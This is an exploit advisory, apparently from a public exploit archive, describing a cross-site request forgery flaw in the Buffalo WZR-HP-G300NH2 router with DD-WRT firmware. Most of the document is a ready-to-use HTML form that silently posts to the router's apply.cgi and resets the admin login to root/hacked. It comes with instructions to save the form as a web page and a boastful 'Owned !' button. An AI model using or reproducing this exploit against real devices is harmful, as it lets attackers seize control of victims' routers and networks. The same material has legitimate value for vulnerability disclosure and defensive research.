######################################################################
# Exploit Title: Buffalo WZR-HP-G300NH2 CSRF Vulnerability 
# Author: Prayas Kulshrestha
# E-mail: officialnlsprayas@gmail.com
# Category: Hardware
# Google Dork: N/A
# Date: 06/10/2013
# Vendor: http://www.buffalotech.com
# Model: WZR-HP-G300NH2
# Firmware Version:  DD-WRT v24SP2-MULTI (10/31/11) std - build 17798 
# Product: http://www.buffalo-asia.com/hongkong/products/product_details.php?id=466&name=WZR-HP-G300NH2
# Tested on: Windows 7 (ultimate) 64-bit
######################################################################

#Introduction
==============
WZR-HP-G300NH2 is a high speed wireless LAN solution and complies with standard IEEE 802.11n 300 Mbps as well as High Power feature.
Wired LAN also supports the Gigabit Ethernet that no matter in the wired or wireless transmission, 
WZR-HP-G300NH2 brings the high quality video era and realizes the comfortable wireless network environment. 
Wireless Security Supports WPA2-PSK (AES, TKIP), WPA-PSK (AES, TKIP), 128/64-bit WEP and sets the wireless security of each level respectively. 
USB2.0 port may be connected to Buffalo's USB external hard drive for network storage after simple setting. 

#Description of Vulnerability
=============================
There is a CSRF vulnerability in the Buffalo WZR-HP-G300NH2 and any one easily change or manipulate the admin username and password. This is will POST request and any one can craft malicious html form with specially crafted POST request 
to the router and on execution of the form the router's user name and password can be changed to anything.

#Exploit
========

<html>
  <!-- Exploit Code by Prayas Kulshrestha -->
  <body>
  <h1>This is the PoC for the CSRF vulnerability in the buffalo router Powered by DD-WRT v24SP2-MULTI (10/31/11) std (SVN revision 17798)</h1>
  <h2>click below to see the magic<h2>

    <form action="http://192.168.1.1/apply.cgi" method="POST">
      <input type="hidden" name="submit&#95;button" value="Management" />
      <input type="hidden" name="action" value="ApplyTake" />
      <input type="hidden" name="change&#95;action" value="" />
      <input type="hidden" name="submit&#95;type" value="" />
      <input type="hidden" name="commit" value="1" />
      <input type="hidden" name="PasswdModify" value="0" />
      <input type="hidden" name="remote&#95;mgt&#95;https" value="0" />
      <input type="hidden" name="http&#95;enable" value="1" />
      <input type="hidden" name="info&#95;passwd" value="0" />
      <input type="hidden" name="https&#95;enable" value="0" />
      <input type="hidden" name="http&#95;username" value="root" />
      <input type="hidden" name="http&#95;passwd" value="hacked" />
      <input type="hidden" name="http&#95;passwdConfirm" value="hacked" />
      <input type="hidden" name="&#95;http&#95;enable" value="1" />
      <input type="hidden" name="refresh&#95;time" value="3" />
      <input type="hidden" name="status&#95;auth" value="1" />
      <input type="hidden" name="maskmac" value="1" />
      <input type="hidden" name="remote&#95;management" value="0" />
      <input type="hidden" name="remote&#95;mgt&#95;ssh" value="0" />
      <input type="hidden" name="remote&#95;mgt&#95;telnet" value="0" />
      <input type="hidden" name="remote&#95;ip&#95;any" value="1" />
      <input type="hidden" name="remote&#95;ip" value="4" />
      <input type="hidden" name="remote&#95;ip&#95;0" value="0" />
      <input type="hidden" name="remote&#95;ip&#95;1" value="0" />
      <input type="hidden" name="remote&#95;ip&#95;2" value="0" />
      <input type="hidden" name="remote&#95;ip&#95;3" value="0" />
      <input type="hidden" name="remote&#95;ip&#95;4" value="0" />
      <input type="hidden" name="boot&#95;wait" value="on" />
      <input type="hidden" name="cron&#95;enable" value="1" />
      <input type="hidden" name="cron&#95;jobs" value="" />
      <input type="hidden" name="nas&#95;enable" value="1" />
      <input type="hidden" name="resetbutton&#95;enable" value="1" />
      <input type="hidden" name="zebra&#95;enable" value="1" />
      <input type="hidden" name="ipv6&#95;enable0" value="0" />
      <input type="hidden" name="radvd&#95;enable" value="0" />
      <input type="hidden" name="radvd&#95;conf" value="" />
      <input type="hidden" name="enable&#95;jffs2" value="0" />
      <input type="hidden" name="clean&#95;jffs2" value="0" />
      <input type="hidden" name="language" value="english" />
      <input type="hidden" name="tcp&#95;congestion&#95;control" value="vegas" />
      <input type="hidden" name="ip&#95;conntrack&#95;max" value="4096" />
      <input type="hidden" name="ip&#95;conntrack&#95;tcp&#95;timeouts" value="3600" />
      <input type="hidden" name="ip&#95;conntrack&#95;udp&#95;timeouts" value="120" />
      <input type="hidden" name="samba&#95;mount" value="0" />
      <input type="hidden" name="samba&#95;share" value="&#47;&#47;yourserverip&#47;yourshare" />
      <input type="hidden" name="samba&#95;user" value="username&#47;computer" />
      <input type="hidden" name="samba&#95;password" value="iwer573495u7340" />
      <input type="hidden" name="samba&#95;script" value="yourscript" />
      <input type="submit" value="Owned !" />
    </form>
  </body>
</html>


==========
Save this as anything.htm and this will change the router's user name and password. 
username:root
password:hacked

#Greetz to : All Indian Hackers.
